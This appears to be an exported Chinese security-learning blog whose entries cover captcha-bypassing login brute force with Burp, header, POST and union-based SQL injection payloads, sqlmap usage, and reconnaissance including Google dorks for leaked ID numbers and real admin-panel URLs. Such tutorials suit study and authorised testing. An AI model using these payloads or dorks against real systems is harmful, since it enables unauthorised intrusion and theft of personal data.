<h3 id="3-在burp的captcha页面配置接口URL和请求模板（Request-template）"><a href="#3-在burp的captcha页面配置接口URL和请求模板（Request-template）" class="headerlink" title="(3)在burp的captcha页面配置接口URL和请求模板（Request template）"></a>(3)在burp的captcha页面配置接口URL和请求模板（Request template）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Authorization:Basic f0ngauth</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8332</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将以上代码直接复制进插件页面的左下角的请求模板中,填写url为<a href="http://127.0.0.1:8888">http://127.0.0.1:8888</a></p>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/3519798e072ba9021b9e1615a331d48f_25444.png" alt=""></p>
<p>点击识别之后通过ddddocr进行了机器学习的识别,可以看到dos面板开始进行了一系列操作</p>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/dcd8e131cc1650b292b9679820a085b0_30657.png" alt=""></p>
<p>此时可在右边的结果栏看到识别成功(这个第一张示例验证码比较复杂,所以识别失误了),但问题不大,识别简单的验证码成功率为百分之99.9%,复杂的验证码就别用这个插件了</p>
<p>以上就是配置识别验证码的接口配置完成,接下来进行批量化处理的教学</p>
<h2 id="4-最终步骤-将验证码识别与爆破结合"><a href="#4-最终步骤-将验证码识别与爆破结合" class="headerlink" title="4.最终步骤:将验证码识别与爆破结合"></a>4.最终步骤:将验证码识别与爆破结合</h2><h3 id="1-按正常步骤进行账号密码验证的抓包"><a href="#1-按正常步骤进行账号密码验证的抓包" class="headerlink" title="(1)按正常步骤进行账号密码验证的抓包"></a>(1)按正常步骤进行账号密码验证的抓包</h3><p>打开拦截开关,抓取登录操作的数据包<br><img src="https://nc0.cdn.zkaq.cn/md/17628/06317ffccd4ebc793631e28675eaca75_74377.png" alt=""></p>
<h3 id="2-发送到intruder模块"><a href="#2-发送到intruder模块" class="headerlink" title="(2)发送到intruder模块"></a>(2)发送到intruder模块</h3><p>和正常的爆破一样,发送到入侵者模块</p>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/93965be147ed7ec36e224d34931819bb_15926.png" alt=""></p>
<h3 id="3-对密码和验证码添加攻击字段标记并选择pitchfork模式"><a href="#3-对密码和验证码添加攻击字段标记并选择pitchfork模式" class="headerlink" title="(3)对密码和验证码添加攻击字段标记并选择pitchfork模式"></a>(3)对密码和验证码添加攻击字段标记并选择pitchfork模式</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/8e18cac2613c154a8bf7d9731edb0347_63977.png" alt=""></p>
<h3 id="4-字段1对应密码-选择字典"><a href="#4-字段1对应密码-选择字典" class="headerlink" title="(4)字段1对应密码,选择字典"></a>(4)字段1对应密码,选择字典</h3><p>payload页面字段1选一个爆破密码的字典<br><img src="https://nc0.cdn.zkaq.cn/md/17628/95bfa4b337dc0106eb87512a3fc25c90_52878.png" alt=""></p>
<h3 id="5-字段2对应captcha-killer模块"><a href="#5-字段2对应captcha-killer模块" class="headerlink" title="(5)字段2对应captcha-killer模块"></a>(5)字段2对应captcha-killer模块</h3><p>第二个payload是验证码的值<br>线程2选择继承插件模式<br>继承插件选择captcha-killer</p>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/7571ffc4af2845b390a7bcbc21bbe18c_79835.png" alt=""></p>
<p>(6)一定注意选择单线程<br>线程池为单线程，否则验证码识别会交叉出现错误,很好理解,因为页面的验证码会一次一换,如果不是一一对应的关系就会出现验证码错误.</p>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/500576e3343d52241a4c0d37e23c06de_83467.png" alt=""></p>
<h3 id="7-最终开始攻击-就会实现密码和验证码一一对应的爆破了"><a href="#7-最终开始攻击-就会实现密码和验证码一一对应的爆破了" class="headerlink" title="(7)最终开始攻击,就会实现密码和验证码一一对应的爆破了"></a>(7)最终开始攻击,就会实现密码和验证码一一对应的爆破了</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/54c65794dfdd115e44193e0d66a6d070_45092.png" alt=""><br>↑此图为本机测试,并未进行未授权攻击</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>谢谢大家观看,这是我的第一篇文章,大家多多支持,欢迎投币哈哈!</p>
]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>=	burp - 工具或插件</tag>
      </tags>
  </entry>
  <entry>
    <title>head注入</title>
    <url>/2023/08/21/head%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="1-什么是head注入"><a href="#1-什么是head注入" class="headerlink" title="1.什么是head注入"></a>1.什么是head注入</h1><p>head:请求头, 比如登录某个网站后提示上次登陆时间,登录设备,登录ip等,这就说明肯定把这些信息放入了数据库</p>
<p>注意:一个网站不会记录所有人的head,只会记录用户,不会记录游客,所以只能从登陆成功或者修改成功的页面去记录[因此,如果存在其他注入,不建议使用head注入]</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">代码层面,插入到数据库的原理:  <span class="keyword">insert</span> <span class="keyword">into</span> xxx <span class="keyword">value</span> (<span class="string">&#x27;用户名&#x27;</span>,<span class="string">&#x27;时间&#x27;</span>,<span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="comment">-- qwe&#x27;)</span></span><br></pre></td></tr></table></figure>
<h1 id="2-手注"><a href="#2-手注" class="headerlink" title="2.手注"></a>2.手注</h1><h2 id="1-尝试成功登陆"><a href="#1-尝试成功登陆" class="headerlink" title="1.尝试成功登陆"></a>1.尝试成功登陆</h2><p>所以可以进行爆破或者自己注册一个账号</p>
<h2 id="2-尝试延时检查是否可能存在注入"><a href="#2-尝试延时检查是否可能存在注入" class="headerlink" title="2.尝试延时检查是否可能存在注入"></a>2.尝试延时检查是否可能存在注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">页面源码:<span class="keyword">INSERT</span> <span class="keyword">INTO</span> ip (`ip`,`username`) <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">10</span>),<span class="number">1</span>) <span class="comment">-- qwe,&#x27;$uname&#x27;)</span></span><br><span class="line"></span><br><span class="line">更改head: <span class="number">1</span><span class="string">&#x27; and sleep(10),1)-- qwe //and和or可以都试试,因为and需要TRUE TRUE,如果第一个FALSE了,第二个参数就没意义</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ip =&gt; 1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">10</span>),<span class="number">1</span>) <span class="comment">-- qwe</span></span><br></pre></td></tr></table></figure>
<p>其中因为没有回显所以只能尝试字段数:</p>
<p>即假设目标的可能、验证目标的可能，不成立就推翻假设新的可能</p>
<p>​       </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">			<span class="number">1</span><span class="string">&#x27; and sleep(10)) -- qwe</span></span><br><span class="line"><span class="string">			1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">10</span>),<span class="number">1</span>) <span class="comment">-- qwe</span></span><br><span class="line">			<span class="number">1</span><span class="string">&#x27; and sleep(10),1,2,3,4,5,6) -- qwe	</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​			&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">​			&quot;,1,1,1,1,1,1)</span><br></pre></td></tr></table></figure>
<p><u><strong><em>select</em> *from user where username =’\’ and password=’ or 1=1 — qwe’</strong></u></p>
<h2 id="3-可以尝试的点"><a href="#3-可以尝试的点" class="headerlink" title="3.可以尝试的点"></a>3.可以尝试的点</h2><p>(1)UA:记录用户信息,比如浏览器版本</p>
<p>(2)referer:记录你从哪里来的,一般用于引流统计</p>
<p>(3)X_FORWARDED_FOR:代理</p>
<p>​            A -&gt; B -&gt; C<br>​                    b就是代理</p>
<p>​            目标如何记录你的IP?<br>​                1、通过数据包来源 你的数据包有发送地址</p>
<p>​            现在的网站，为了快速运行，会使用CDN技术、负载均衡<br>​                网站访问量太大了，然后目标承受不了</p>
<p>​                在外部布置一大堆服务器，记录了很多的缓存信息。然后遇到没有记录的信息。他会去请求目标。<br>​                武汉、南昌、杭州</p>
<p>​                如果目标是记录数据包来源！<br>​                    当秘书来找领导的时候，领导不知道是谁访问的<br>​                    X_FORWARDED_FOR: 告诉领导是谁托我来的<br>​                    head:X_FORWARDED_FOR: XXXXX</p>
<h2 id="4-找库名"><a href="#4-找库名" class="headerlink" title="4.找库名"></a>4.找库名</h2><p>因为head注入没有回显,所以步骤有两个:</p>
<h3 id="1-盲注注入"><a href="#1-盲注注入" class="headerlink" title="(1)盲注注入"></a>(1)盲注注入</h3><p>不复杂,但是很繁琐</p>
<h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="(2)报错注入"></a>(2)报错注入</h3><p>依靠数据库的函数，想办法让他报错，然后在错误信息里面有我们想要的值</p>
<p>比如:updatexml(目标xml内容，xml文档路径，更新的内容)</p>
<p><strong>updatexml(1,路径,2)</strong>   //更新XML的内容,[其原理为:一些特殊字符不能当路径 ! 出现了就会报错]</p>
<p>此时需要用到MySQL的拼接字符串函数: concat()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;!&#x27;</span>,database()),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="5-找表名字段名"><a href="#5-找表名字段名" class="headerlink" title="5.找表名字段名"></a>5.找表名字段名</h2><p>和找库名的原理相同,使用到子查询:优先进行查询的查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;!&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;and updatexml(1,concat(&#x27;</span><span class="operator">!</span><span class="string">&#x27;,database()),1),1) -- qwe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;!&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">-- qwe</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="3-sqlmap跑head注入"><a href="#3-sqlmap跑head注入" class="headerlink" title="3.sqlmap跑head注入"></a>3.sqlmap跑head注入</h1><p>直接抓包，-r 在需要跑的head上打*</p>
<p>sqlmap的测试是分等级<br>        等级越高，测试的手段和方法越多。<br>        有些sql注入等级低，无法测出，等级高就可以测试</p>
<p>​        等级越高，测试速度越慢。</p>
<p>​    —level [1-5]<br>​    —risk [1-4]<br>​        </p>
<p><strong>跑的仔细一点：—level 3 —risk 2</strong></p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>msf后渗透</title>
    <url>/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>代码执行漏洞</title>
    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>post注入</title>
    <url>/2023/08/21/post%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="1-什么是post注入"><a href="#1-什么是post注入" class="headerlink" title="1.什么是post注入?"></a>1.什么是post注入?</h1><p>定义:用户通过post传参的数据被当做sql语句执行的注入(和get注入只有传参方式的不同)</p>
<p>注意:post传参不受url编码影响</p>
<h1 id="2-sqlmap跑post注入"><a href="#2-sqlmap跑post注入" class="headerlink" title="2.sqlmap跑post注入"></a>2.sqlmap跑post注入</h1><h2 id="1-第一种方法-—form"><a href="#1-第一种方法-—form" class="headerlink" title="1.第一种方法: —form"></a>1.第一种方法: —form</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;URL&quot;</span> --form   //自动在这个页面上寻找post的传参点</span><br></pre></td></tr></table></figure>
<h2 id="2-第二种方法-抓包法-r"><a href="#2-第二种方法-抓包法-r" class="headerlink" title="2.第二种方法:抓包法 -r"></a>2.第二种方法:抓包法 -r</h2><p>建议第二种方法,因为:</p>
<p>(1)可以直接强行制定找到你想要跑的传参[通过在参数结尾加上    *     ]</p>
<p>(2)可以针对需要权限的注入[比如需要登陆之后才有的页面,获取cookie]</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2023/08/21/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="1-什么是sql注入"><a href="#1-什么是sql注入" class="headerlink" title="1.什么是sql注入"></a>1.什么是sql注入</h1><p>SQL注入：针对网站的一种攻击方式（严重/高危）</p>
<p>​    核心定义：用户的传参会当作SQL代码进行执行.<br>​        ‘ or 1=1 — qwe</p>
<p>​    危害：获取数据库的信息、可以拿下服务器<br>​        （互联网公司、就是  数据  ）</p>
<p>​    1998年提出的</p>
<h1 id="2-如何判断目标是否存在sql注入"><a href="#2-如何判断目标是否存在sql注入" class="headerlink" title="2.如何判断目标是否存在sql注入?"></a>2.如何判断目标是否存在sql注入?</h1><h2 id="1-sqlmap-自动化sql注入工具"><a href="#1-sqlmap-自动化sql注入工具" class="headerlink" title="(1)sqlmap 自动化sql注入工具"></a>(1)sqlmap 自动化sql注入工具</h2><p>​        1、工具不可靠（工具有点呆）<br>​        2、有些网站会有防护措施，工具基本跑不了<br>​        3、项目上要求手动，不准工具<br>​        4、要了解原理才能够更加理解漏洞的核心</p>
<p>​        sqlmap只能跑SQL注入<br>​        （如果没有传参的网站正常情况下没有漏洞）<br>​        -u “<a href="http://rykm6453.ia.aqlab.cn/">http://rykm6453.ia.aqlab.cn/</a>“<br>​        你让SQLMAP去测试 一定要有传参点 (?id=)</p>
<h2 id="2-手动"><a href="#2-手动" class="headerlink" title="(2)手动"></a>(2)手动</h2><h3 id="1-经典判断："><a href="#1-经典判断：" class="headerlink" title="1.经典判断："></a>1.经典判断：</h3><p>​            id=1 and 999=999 正确 [和 True]<br>​            id=1 and 788=7 错误 [和 False]<br>​            and -1=-1<br>​            and 2&gt;3<br>​            and 4&gt;2</p>
<p>​            ‘ and 1=1 — qwe<br>​            ‘ and 1=2 — qwe ( ‘—空格’在sql语句中是注释的意思,因为前面主动进行了闭合,造成后面真实符号冗余,通过加入’— qwe’ 后台代码中的真实符号注释掉,否则会多出右半边的符号,会报错)</p>
<p>​            ‘ in (1) — qwe</p>
<p>​            id=1 in (1) 正确<br>​            id=1 in (2) 错误</p>
<p>​            and FIND_IN_SET(id,1)<br>​            and instr(1,id)</p>
<p>​            -1=-1<br>​            9&gt;7<br>​            9-1=8</p>
<h3 id="2-延时法"><a href="#2-延时法" class="headerlink" title="2.延时法:"></a>2.延时法:</h3><p>页面怎么都不变，那你怎么知道你传的东西当代码执行了？<br>                    注入类型：延时盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> sleep(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p>​                    很不正常，无论你传入啥玩意返回都一样</p>
<h1 id="3-如何通过手注拿到目标数据库内信息"><a href="#3-如何通过手注拿到目标数据库内信息" class="headerlink" title="3.如何通过手注拿到目标数据库内信息"></a>3.如何通过手注拿到目标数据库内信息</h1><h2 id="1-联合查询注入（注入中的一种）-union"><a href="#1-联合查询注入（注入中的一种）-union" class="headerlink" title="(1)联合查询注入（注入中的一种） union"></a>(1)联合查询注入（注入中的一种） union</h2><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路:"></a>总体思路:</h3><p>找注入 -&gt; 猜字段 -&gt; 找输出点 -&gt; 查库名 -&gt; 查表名 -&gt; 查字段 -&gt; 查数据</p>
<h3 id="1-union"><a href="#1-union" class="headerlink" title="1.union:"></a>1.union:</h3><p> UNION 操作符用于合并两个或多个 SELECT 语句的结果集</p>
<p>!!!!!!!!!!!!!需要条件！前后两条Sql语句字段数相同!!!!!!!!!!!!!!!!!!!!!!!</p>
<h3 id="2-order-by"><a href="#2-order-by" class="headerlink" title="2.order by:"></a>2.order by:</h3><p>排序 快速的知道当前SQL语句的结果集的字段数</p>
<h3 id="3-找显示位"><a href="#3-找显示位" class="headerlink" title="3.找显示位:"></a>3.找显示位:</h3><p>我们要把想知道的数据放在显示位上</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="comment">-- 查到多少字段就找多少,在显示位置写sql语句</span></span><br></pre></td></tr></table></figure>
<h3 id="4-database"><a href="#4-database" class="headerlink" title="4.database()"></a>4.database()</h3><p>按照步骤进行查找:库、表、字段、数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
<p>information_schema.schemata,提供了当前MySQL实例中所有的数据库信息，show datsbases结果取之此表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">-- 查找所有库名</span></span><br></pre></td></tr></table></figure>
<h3 id="5-利用information-schema查表名"><a href="#5-利用information-schema查表名" class="headerlink" title="5.利用information_schema查表名"></a>5.利用information_schema查表名</h3><p>   mysql系统自带库5.0才有的库<br>                            information_schema.tables 存放着表和库的对应<br>                            库.表   :   选中这个库里面这个表<br>                            a.b        选中a库里面的b表<br>                            table_name 表名<br>                            table_schema 库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="6-利用’limit-x-y’-进行限制输出"><a href="#6-利用’limit-x-y’-进行限制输出" class="headerlink" title="6.利用’limit x,y’ 进行限制输出"></a>6.利用’limit x,y’ 进行限制输出</h3><p>limit 0,1 —&gt;第一个数字0是数据的下标,即第一个数据 —&gt;第二个数字1表示在前面的基础上向后输出几位 —&gt;整体表示输出第一个表</p>
<p>limit 9,9  从第10条数据开始取，取9条</p>
<h3 id="7-利用information-schema查字段"><a href="#7-利用information-schema查字段" class="headerlink" title="7.利用information_schema查字段"></a>7.利用information_schema查字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">8.5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span>  table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="8-查数据"><a href="#8-查数据" class="headerlink" title="8.查数据"></a>8.查数据</h3><p>经过5,6,7步,已经获取到了表名和列名,则直接可以进行sql查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">8.5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,password <span class="keyword">from</span> admin </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>-- sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计概述</title>
    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2023/08/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>渗透测试最重要的就是信息搜集   （1、信息收集 2、运气 3、攻击技术手段）</p>
<h2 id="攻击面要广"><a href="#攻击面要广" class="headerlink" title="攻击面要广"></a>攻击面要广</h2><p>​            渗透测试的本质是找漏洞，找错误，越多目标错误越多</p>
<h2 id="信息收集需要收集啥？"><a href="#信息收集需要收集啥？" class="headerlink" title="信息收集需要收集啥？"></a>信息收集需要收集啥？</h2><h3 id="1、whois-域名注册时留下的信息"><a href="#1、whois-域名注册时留下的信息" class="headerlink" title="1、whois  [域名注册时留下的信息]"></a>1、whois  [域名注册时留下的信息]</h3><p>​            国内:    <a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a><br>​            境外:    whois.com<br>​            查企业： (暂时免费)小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></p>
<h3 id="2、子域名："><a href="#2、子域名：" class="headerlink" title="2、子域名："></a>2、子域名：</h3><p>baidu.com     a.baidu.com  b.baidu.com  =&gt; 同一个公司<br>            1、在线工具：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a>  <a href="http://www.dnsscan.cn/dns.html">http://www.dnsscan.cn/dns.html</a><br>            2、搜索引擎：site:域名<br>            3、暴破DNS：问询DNS的情况可以获得子域名</p>
<p>​            4.https证书查询 (针对大厂比较好,因为https需要申请)    可通过此境外网站进行查询 <a href="https://crt.sh/">https://crt.sh/</a></p>
<p>会对目标网站有影响？几乎没有<br>                windows： 子域名挖掘机<br>                Linux: subDomainsBrute</p>
<h3 id="3、旁站：-同IP站点（同一个IP站点）"><a href="#3、旁站：-同IP站点（同一个IP站点）" class="headerlink" title="3、旁站： 同IP站点（同一个IP站点）"></a>3、旁站： 同IP站点（同一个IP站点）</h3><p>​            同一个ip的多个网站代表什么？<br>​                1、同服务器 [A服务搭建了100个网站，从任何一个网站攻破A服务器，那么就拿下了另外99个站]<br>​                2、或者同内网 [内网渗透 [内网比外网要不安全]]</p>
<p>​            在线工具查：大数据分析  <a href="https://tool.chinaz.com/">https://tool.chinaz.com/</a></p>
<h3 id="4、C段：同一个IP段-（可能是同一个公司的资产）"><a href="#4、C段：同一个IP段-（可能是同一个公司的资产）" class="headerlink" title="4、C段：同一个IP段 （可能是同一个公司的资产）"></a>4、C段：同一个IP段 （可能是同一个公司的资产）</h3><p>​        166.111.4.100<br>​        166.111.4.1 - 166.111.4.255  一个C段</p>
<p>​            需要慎重,因为不一定是同一个公司的资产</p>
<h3 id="5-目录扫描"><a href="#5-目录扫描" class="headerlink" title="5.目录扫描"></a>5.目录扫描</h3><p>1、不同的目录可以是多个网站？不同的网站可能存在不同的漏洞<br>                <a href="http://cntj8003.ia.aqlab.cn/dami_777/dami_888/index.php">http://cntj8003.ia.aqlab.cn/dami_777/dami_888/index.php</a><br>                <a href="http://cntj8003.ia.aqlab.cn/bluecms/uploads/">http://cntj8003.ia.aqlab.cn/bluecms/uploads/</a><br>                <a href="http://cntj8003.ia.aqlab.cn">http://cntj8003.ia.aqlab.cn</a></p>
<p>​        2、找后台、找功能[登录功能、上传功能、报错信息]</p>
<p>​        3、找信息泄露(扫描到过源码，WWW.zip  WWW.tar.gz 数据库文件 下载他们源码)</p>
<p>​        4、.git  .svn .ig 信息泄露</p>
<p>​        核心办法：字典暴破<br>​            被ban: 访问得太快了，然后拉黑了你得ip<br>​                1、访问的慢一点（延时）<br>​                2、换IP （10个IP）</p>
<p>​            7kbscan 这个工具需要.net 运行的时候需要.net C#运行环境</p>
<p>​        robots.txt 君子协议  (网络爬虫)</p>
<p>​            <a href="https://moodle.zjnu.edu.cn/admin/index.php">https://moodle.zjnu.edu.cn/admin/index.php</a>  </p>
<p>5、内容敏感信息泄露<br>                谷歌语法：谷歌的高级搜索方法<br>                Google / baidu 【Google国内不能访问】<br>                    1、在不受限制的国家（香港、澳门、台湾省、其他地区）<br>                    2、翻墙[通过点对点的传输办法，让境外的服务器帮你访问]<br>                        违法行为！！不要去做！！有概率拘留<br>                    3、谷歌镜像站（人家拷贝了一份谷歌的数据，然后做成了网站）<br>                        不是违法行为，实际上而言，比较迷糊</p>
<p>​            Google &gt;&gt;&gt;&gt;&gt;&gt;&gt; baidu</p>
<p>​            通过网络空间搜索引擎找谷歌镜像</p>
<p>​                site:  指定域名<br>​                filetype:xls  指定文件类型<br>​                    site:hnu.edu.cn filetype:xls<br>​                    提交：姓名 + 身份证号码<br>​                        姓名 + 电话号码<br>​                inurl:admin.php</p>
<p>​                google hacking </p>
<p>​                <a href="https://blog.csdn.net/huweiliyi/article/details/105442118">https://blog.csdn.net/huweiliyi/article/details/105442118</a></p>
<p>​                真的有技术的老哥：只挖活动、只挖新资产<br>​                    <a href="https://src.sjtu.edu.cn/">https://src.sjtu.edu.cn/</a>  教育<br>​                    <a href="https://www.butian.net/Reward/plan/2">https://www.butian.net/Reward/plan/2</a><br>​                    <a href="https://www.vulbox.com/">https://www.vulbox.com/</a>  全国都要[但是安全没有保障]</p>
<h3 id="6、网络空间搜索引擎"><a href="#6、网络空间搜索引擎" class="headerlink" title="6、网络空间搜索引擎"></a>6、网络空间搜索引擎</h3><p>​                特殊的搜索引擎</p>
<p>​                fofa （<a href="https://fofa.info/）">https://fofa.info/）</a><br>​                钟馗之眼(zoomeye)<br>​                shadan<br>​                奇安信（<a href="https://hunter.qianxin.com/）">https://hunter.qianxin.com/）</a></p>
<p>​                临时邮箱：十分钟邮箱<br>​                    <a href="https://10minutemail.info/">https://10minutemail.info/</a></p>
<h3 id="7、指纹识别-识别目标网站是否是CMS-网站的框架、结构"><a href="#7、指纹识别-识别目标网站是否是CMS-网站的框架、结构" class="headerlink" title="7、指纹识别(识别目标网站是否是CMS 网站的框架、结构)"></a>7、指纹识别(识别目标网站是否是CMS 网站的框架、结构)</h3><p>​                PHP XXXX<br>​                Apache<br>​                Tomcat</p>
<p>​                不一定对，尤其是版本非常容易错</p>
<h3 id="8、端口扫描"><a href="#8、端口扫描" class="headerlink" title="8、端口扫描()"></a>8、端口扫描()</h3><p>​        带头大哥、路人甲</p>
<p>​        有攻击必然有防御</p>
<p>​        WAF : 网站的防护软件  （你传恶意的参数的时候他不允许你访问）<br>​            正则表达式： 分析你的传参是不是恶意的，如果是恶意的那就拦截你</p>
<h3 id="找后台："><a href="#找后台：" class="headerlink" title="找后台："></a>找后台：</h3><p>​            1、搜索引擎<br>​            2、CMS固定后台[CMS的后台地址是固定]<br>​            3、目录扫描。[暴破] 网站的文件命名是有规则<br>​                御剑  </p>
<p>​            4.inurl:  指定URL        搜索引擎的高级搜索方式，指定URL  site: 指定域名<br>​                /admin<br>​                /admin.php<br>​                /admin/login.php<br>​                /admin.php?s=/Public/login<br>​                /index.php?s=/Public/login</p>
<p>​            <a href="https://wxs-dell.eub-inc.com/admin/login.php">https://wxs-dell.eub-inc.com/admin/login.php</a></p>
<hr>
<h1 id="信息搜集脑图"><a href="#信息搜集脑图" class="headerlink" title="信息搜集脑图"></a>信息搜集脑图</h1><h2 id="什么需要收集"><a href="#什么需要收集" class="headerlink" title="什么需要收集"></a>什么需要收集</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><ul>
<li><p>得到域名注册人的信息</p>
<ul>
<li>邮箱</li>
<li>电话号码</li>
<li>姓名</li>
</ul>
</li>
</ul>
<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><ul>
<li>可以扩大攻击范围，子域名一定是有关联的，很多时候基本上都同属一个公司</li>
</ul>
<h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><ul>
<li>危险端口可以直接爆破入侵，一个Ip可能搭建了多个网站，分布在不同的端口</li>
</ul>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul>
<li>目录扫描有的时候可以访问到压缩包源码、编辑器目录、废弃页面、其他站点</li>
</ul>
<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><ul>
<li>识别CMS，寻找通杀漏洞</li>
</ul>
